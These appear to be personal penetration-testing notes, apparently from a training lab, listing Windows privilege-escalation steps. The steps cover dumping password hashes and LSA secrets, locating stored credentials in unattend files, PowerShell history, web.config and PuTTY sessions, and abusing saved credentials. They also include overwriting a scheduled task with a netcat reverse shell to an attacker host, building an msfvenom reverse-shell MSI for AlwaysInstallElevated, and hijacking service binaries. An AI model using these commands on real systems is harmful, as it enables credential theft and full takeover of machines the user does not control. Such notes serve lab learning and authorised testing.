```
hashdump
lsa_dump_secrets
```



Possible locations of stored admin creds from and image install

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

Regular Command Line
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Powershell
```
$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```


```
cmdkey /list
```
If Creds are saved use cmd below
```
runas /savedcred /user:admin cmd.exe
```

Stored Creds here on IIS servers
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

If putty is installed
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

```
schtasks /fo /ist /v
```
run icacls on files that are scheduled to run to see if they can be modified
```
icacls 
```
```
echo c:\tools\nc64.exe -e cmd.exe attackerIP AttackerPORT > C:\location\of\scheduledtask.bat
```


```
C:\> schtasks /run /tn vulntask
```


Check these two reg keys
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

```

if both are set you can generate a malicious .msi file using msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.67.255 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Then run
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

See every service that is running
```
sc queryex type= service state= all
```
Powershell version

```
Get-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName, State
```
The configs for services are stored under 
HKLM\SYSTEM\CurrentControlSet\Services\*

ICACLs the binary of the services

Replace service binary then start stop service
```
sc stop windowsscheduler
sc start windowsscheduler
```

!!Look for quotes in binary path of services!!
if services are unquotes there could be a possibility to add a new file within the services


you can also see if you can change the configuration of the services 
```
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```